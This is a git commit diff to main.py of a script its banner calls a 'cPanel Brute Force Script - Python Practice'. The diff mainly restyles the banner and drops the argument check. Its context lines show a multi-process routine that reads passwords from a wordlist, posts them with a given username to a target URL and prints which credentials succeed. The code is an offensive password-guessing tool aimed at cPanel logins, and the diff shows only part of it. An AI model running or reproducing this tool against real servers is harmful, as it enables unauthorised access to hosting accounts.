61e03382203718c2291e5a5592f688f7c47252fb
Forbidden_403 <terpesonaewidwud@gmail.com>
2025-12-23 15:15:53 +0700

    main.py

--- main.py
+++ main.py
@@ -5,28 +5,22 @@ from multiprocessing import Pool
 
 init(autoreset=True)
 
-
-def banner():
-    print(Fore.CYAN + r"""
+banner = f"""
+{Fore.RED}
  _____          _     _     _     _             _  _    ___ _____ 
 |  ___|__  _ __| |__ (_) __| | __| | ___ _ __  | || |  / _ \___ / 
 | |_ / _ \| '__| '_ \| |/ _` |/ _` |/ _ \ '_ \ | || |_| | | ||_ \ 
 |  _| (_) | |  | |_) | | (_| | (_| |  __/ | | ||__   _| |_| |__) |
 |_|  \___/|_|  |_.__/|_|\__,_|\__,_|\___|_| |_|___|_|  \___/____/ 
                                              |_____|              
-    """)
-    print(Fore.YELLOW + "cPanel Brute Force Script - Python Practice\n")
-
-
-if len(sys.argv) != 5:
-    print("Usage: python3 main.py <URL> <USERNAME> <WORDLIST> <THREADS>")
-    sys.exit(1)
+{Fore.LIGHTBLUE_EX}      Usage: python3 main.py <URL> <USERNAME> <WORDLIST> <THREADS>               
+"""
+print(banner)
 
 url = sys.argv[1]
 username = sys.argv[2]
 wordlist = sys.argv[3]
 user_input = int(sys.argv[4])
-
 
 def bf(password):
     data = {
@@ -39,10 +33,6 @@ def bf(password):
         print(Fore.LIGHTGREEN_EX + f"[+] Login Successful -> {username}:{password}")
     else:
         print(Fore.RED + f"[-] Login Failed -> {username}:{password}")
-
-
-banner()
-
 
 with open(wordlist, "r", encoding="latin-1") as f:
     passwords = [line.strip() for line in f]
